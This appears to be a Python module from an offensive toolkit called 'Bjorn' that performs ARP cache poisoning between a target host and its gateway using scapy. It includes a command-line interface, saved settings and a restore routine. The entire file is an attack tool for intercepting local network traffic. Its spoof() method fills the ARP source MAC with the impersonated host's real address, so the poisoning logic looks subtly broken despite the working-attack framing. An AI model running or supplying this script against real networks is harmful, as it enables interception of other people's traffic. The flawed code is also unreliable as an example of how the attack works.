"""arp_spoofer.py - ARP cache poisoning between target and gateway (scapy)."""

import os
import json
import time
import argparse
from scapy.all import ARP, send, sr1, conf


b_class       = "ARPSpoof"
b_module      = "arp_spoofer"
b_enabled    = 0
# Settings directory and file
SETTINGS_DIR = "/home/bjorn/.settings_bjorn"
SETTINGS_FILE = os.path.join(SETTINGS_DIR, "arpspoofer_settings.json")

class ARPSpoof:
    def __init__(self, target_ip, gateway_ip, interface, delay):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.delay = delay
        conf.iface = self.interface
        print(f"ARPSpoof initialized with target IP: {self.target_ip}, gateway IP: {self.gateway_ip}, interface: {self.interface}, delay: {self.delay}s")

    def get_mac(self, ip):
        """Gets the MAC address of a target IP by sending an ARP request."""
        print(f"Retrieving MAC address for IP: {ip}")
        try:
            arp_request = ARP(pdst=ip)
            response = sr1(arp_request, timeout=2, verbose=False)
            if response:
                print(f"MAC address found for {ip}: {response.hwsrc}")
                return response.hwsrc
            else:
                print(f"No ARP response received for IP {ip}")
                return None
        except Exception as e:
            print(f"Error retrieving MAC address for {ip}: {e}")
            return None

    def spoof(self, target_ip, spoof_ip):
        """Sends an ARP packet to spoof the target into believing the attacker's IP is the spoofed IP."""
        print(f"Preparing ARP spoofing for target {target_ip}, pretending to be {spoof_ip}")
        target_mac = self.get_mac(target_ip)
        spoof_mac = self.get_mac(spoof_ip)
        if not target_mac or not spoof_mac:
            print(f"Cannot find MAC address for target {target_ip} or {spoof_ip}, spoofing aborted")
            return

        try:
            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
            send(arp_response, verbose=False)
            print(f"Spoofed ARP packet sent to {target_ip} claiming to be {spoof_ip}")
        except Exception as e:
            print(f"Error sending ARP packet to {target_ip}: {e}")

    def restore(self, target_ip, spoof_ip):
        """Sends an ARP packet to restore the legitimate IP/MAC mapping for the target and spoof IP."""
        print(f"Restoring ARP association for {target_ip} using {spoof_ip}")
        target_mac = self.get_mac(target_ip)
        gateway_mac = self.get_mac(spoof_ip)

        if not target_mac or not gateway_mac:
            print(f"Cannot restore ARP, MAC addresses not found for {target_ip} or {spoof_ip}")
            return

        try:
            arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=gateway_mac)
            send(arp_response, verbose=False, count=5)
            print(f"ARP association restored between {spoof_ip} and {target_mac}")
        except Exception as e:
            print(f"Error restoring ARP association for {target_ip}: {e}")

    def execute(self):
        """Executes the ARP spoofing attack."""
        try:
            print(f"Starting ARP Spoofing attack on target {self.target_ip} via gateway {self.gateway_ip}")

            while True:
                target_mac = self.get_mac(self.target_ip)
                gateway_mac = self.get_mac(self.gateway_ip)

                if not target_mac or not gateway_mac:
                    print(f"Error retrieving MAC addresses, stopping ARP Spoofing")
                    self.restore(self.target_ip, self.gateway_ip)
                    self.restore(self.gateway_ip, self.target_ip)
                    break

                print(f"Sending ARP packets to poison {self.target_ip} and {self.gateway_ip}")
                self.spoof(self.target_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.target_ip)

                time.sleep(self.delay)

        except KeyboardInterrupt:
            print("Attack interrupted. Restoring ARP tables.")
            self.restore(self.target_ip, self.gateway_ip)
            self.restore(self.gateway_ip, self.target_ip)
            print("ARP Spoofing stopped and ARP tables restored.")
        except Exception as e:
            print(f"Unexpected error during ARP Spoofing attack: {e}")

def save_settings(target, gateway, interface, delay):
    """Saves the ARP spoofing settings to a JSON file."""
    try:
        os.makedirs(SETTINGS_DIR, exist_ok=True)
        settings = {
            "target": target,
            "gateway": gateway,
            "interface": interface,
            "delay": delay
        }
        with open(SETTINGS_FILE, 'w') as file:
            json.dump(settings, file)
        print(f"Settings saved to {SETTINGS_FILE}")
    except Exception as e:
        print(f"Failed to save settings: {e}")

def load_settings():
    """Loads the ARP spoofing settings from a JSON file."""
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, 'r') as file:
                return json.load(file)
        except Exception as e:
            print(f"Failed to load settings: {e}")
    return {}

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="ARP Spoofing Attack Script")
    parser.add_argument("-t", "--target", help="IP address of the target device")
    parser.add_argument("-g", "--gateway", help="IP address of the gateway")
    parser.add_argument("-i", "--interface", default=conf.iface, help="Network interface to use (default: primary interface)")
    parser.add_argument("-d", "--delay", type=float, default=2, help="Delay between ARP packets in seconds (default: 2 seconds)")
    args = parser.parse_args()

    # Load saved settings, override with CLI args
    settings = load_settings()
    target_ip = args.target or settings.get("target")
    gateway_ip = args.gateway or settings.get("gateway")
    interface = args.interface or settings.get("interface")
    delay = args.delay or settings.get("delay")

    if not target_ip or not gateway_ip:
        print("Target and Gateway IPs are required. Use -t and -g or save them in the settings file.")
        exit(1)

    # Persist settings for future runs
    save_settings(target_ip, gateway_ip, interface, delay)

    # Launch ARP spoof
    spoof = ARPSpoof(target_ip=target_ip, gateway_ip=gateway_ip, interface=interface, delay=delay)
    spoof.execute()
